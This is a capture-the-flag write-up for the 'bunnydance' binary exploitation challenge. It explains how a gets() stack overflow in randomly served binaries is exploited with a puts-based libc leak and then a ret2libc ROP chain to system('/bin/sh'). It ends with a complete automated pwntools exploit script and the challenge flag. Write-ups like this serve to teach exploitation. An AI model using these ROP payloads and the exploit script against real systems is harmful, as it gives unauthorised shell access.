# bunnydance

## Description

Wait a minute isn't this just DARPA CGC LITE v3.0?

Guys seriously maybe we should stop putting this challenge in every CTF...

Difficulty: Medium

chal.b01lers.com 4001

by nsnc

## Challenge

Connecting to the socket gives us some binary data as an escaped ASCII string.
We can see from the header that this is an executable file.

After this data, we are given a prompt such as "Message: " or "Name: ".
We can send a line of input to the challenge and it will return "Got: " followed by our input.
We are then given another prompt with "flag> ", where we are meant to enter the flag for that part of the challenge.

This process repeats for a total of 9 parts, each in the same format.
The binaries and flags seem to be randomly selected from a pool of possible problems.
Typing the correct flag for all 9 parts gives the flag for this challenge.

### Mitigations

If we parse the binary data and save it to a file, we can check the mitigations present:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

From repeating this process multiple times, it seems that these are the strictest mitigations present in any of the files.

### Disassembly

The binaries are relatively simple:

```c
[0x00401060]> pdg @ main

undefined8 main(void)
{
    int64_t var_34h;
    
    var_34h._0_4_ = sym.imp.setvbuf(_reloc.stdin, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stderr, 0, 2, 0);
    sym.imp.puts("Name: ");
    sym.imp.gets((int64_t)&var_34h + 4);
    sym.imp.puts("Hello, ");
    sym.imp.puts((int64_t)&var_34h + 4);
    return 0;
}
```

## Solution

If we download multiple binaries from the remote server, we can see that there are minor differences:

### bin0

```c
undefined8 main(void)
{
    int64_t var_24h;
    
    var_24h._0_4_ = sym.imp.setvbuf(_reloc.stdin, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stderr, 0, 2, 0);
    sym.imp.system("echo \'Message: \'");
    sym.imp.gets((int64_t)&var_24h + 4);
    sym.imp.puts("Got: ");
    sym.imp.puts((int64_t)&var_24h + 4);
    return 0;
}
```

### bin1

```c
undefined8 main(void)
{
    int64_t var_ch;
    
    var_ch._0_4_ = sym.imp.setvbuf(_reloc.stdin, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stderr, 0, 2, 0);
    sym.imp.puts("Message: ");
    sym.imp.gets((int64_t)&var_ch + 4);
    sym.imp.puts("Got: ");
    sym.imp.puts((int64_t)&var_ch + 4);
    return 0;
}
```

### bin2

```c
undefined8 main(void)
{
    int64_t var_34h;
    
    var_34h._0_4_ = sym.imp.setvbuf(_reloc.stdin, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stderr, 0, 2, 0);
    sym.imp.puts("Name: ");
    sym.imp.gets((int64_t)&var_34h + 4);
    sym.imp.puts("Hello, ");
    sym.imp.puts((int64_t)&var_34h + 4);
    return 0;
}
```

### Vulnerability

Importantly, all of them contain a call to `gets` and store user input on the stack.
There is no canary, so we can use this to easily overflow the buffer and overwrite the saved RIP.
However, the size of the buffer differs between binaries.

### Finding the offset

Using the local file we created, we can automatically find the offset to the saved RIP by sending a cyclic pattern and causing the program to crash, then analysing the core dump:

```py
p = local()

p.sendline(cyclic(0x80, n=8))
p.recvall()

core = p.corefile

fault = cyclic_find(core.fault_addr, n=8)
```

### Finding libc

Now that we have the offset, we can use `puts` to leak the address of libc:

```py
main = exe.symbols['main']
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

leak_payload = flat({
    fault: [
        pop_rdi,
        puts_got,
        puts_plt,
        main,
        ]
    })
```
We also return to the main function so we can send user input again in the next stage of the exploit.

The payload above will print the address of `puts` from the Global Offset Table.
Using the last 3 nibbles, we can determine that the libc version is 2.31 and we can calculate the base address of libc.

```py
io.recvuntil(('Got: \n', 'Hello, \n'))
io.recvline()
libc_leak = io.recvline()[:-1]
print(libc_leak)

libc.address = u64(libc_leak.ljust(8, b'\x00')) - libc.symbols['puts']
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
```

### Getting a shell and flag

Now we're back in the main function and we know the address of libc.
We've calculated the address of the string `"/bin/sh\x00"` and the `system` function.
We can use this in a second payload to call `system("/bin/sh")` and get a shell:

```py
shell_payload = flat({
    fault: [
        ret,
        pop_rdi,
        bin_sh,
        system,
        ]
    })
```

Now we can read the `flag.txt` file and send it back to the challenge:

```py
io.sendline('cat flag.txt')
flag = io.recvuntil('}')
io.success("Flag: {}".format(flag))
io.sendline('exit')
io.recvuntil('flag>')
io.sendline(flag)
```

We have now completed one part of the challenge.
This has to be repeated for all 9 parts and we will receive the flag for the challenge.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chal.b01lers.com --port 4001
from pwn import *
from IPython import embed

import codecs

# Set up pwntools for the correct architecture
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")
ld = ELF("./ld-2.31.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chal.b01lers.com'
port = int(args.PORT or 4001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    return remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

problem = 0
io = start()
io.recvline()
io.recvline()
io.recvline()
io.recvline()

while problem < 9:
    io.recvuntil("b")
    raw = io.recvuntil(": \n")
    raw = raw[1:raw.rfind(b"'")]
    b = codecs.escape_decode(raw)[0]
    f = open('bin', 'wb')
    f.write(b)
    f.close()

    exe = context.binary = ELF('bin')

    p = process('./bin')

    base = 0x400000

    main = exe.symbols['main']
    puts_plt = exe.plt['puts']
    puts_got = exe.got['puts']
    p.success("main address: {}".format(hex(main)))
    p.success("puts_plt address: {}".format(hex(puts_plt)))
    p.success("puts_got address: {}".format(hex(puts_got)))

    p.recvuntil(": \n")
    p.sendline(cyclic(0x80, n=8))
    p.recvall()

    core = p.corefile

    fault = cyclic_find(core.fault_addr, n=8)

    rop = ROP(exe)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    leak_payload = flat({
        fault: [
            pop_rdi,
            puts_got,
            puts_plt,
            main,
            ]
        })

    io.sendline(leak_payload)

    io.recvuntil(('Got: \n', 'Hello, \n'))
    io.recvline()
    libc_leak = io.recvline()[:-1]

    libc.address = u64(libc_leak.ljust(8, b'\x00')) - (libc.symbols['puts'] - libc.address)
    bin_sh = next(libc.search(b'/bin/sh'))
    system = libc.symbols['system']
    io.success("libc address: {}".format(hex(libc.address)))
    io.success("/bin/sh address: {}".format(hex(bin_sh)))
    io.success("system address: {}".format(hex(system)))

    shell_payload = flat({
        fault: [
            ret,
            pop_rdi,
            bin_sh,
            system,
            ]
        })

    io.sendline(shell_payload)
    io.recvuntil(('Got: \n', 'Hello, \n'))
    io.recvline()

    io.sendline('cat flag.txt')
    flag = io.recvuntil('}')
    io.success("Flag: {}".format(flag))
    io.sendline('exit')
    io.recvuntil('flag>')
    io.sendline(flag)

    problem += 1

io.interactive()
```

## Flag

`flag{n0w_d0_th3_bunnyd4nc3}`

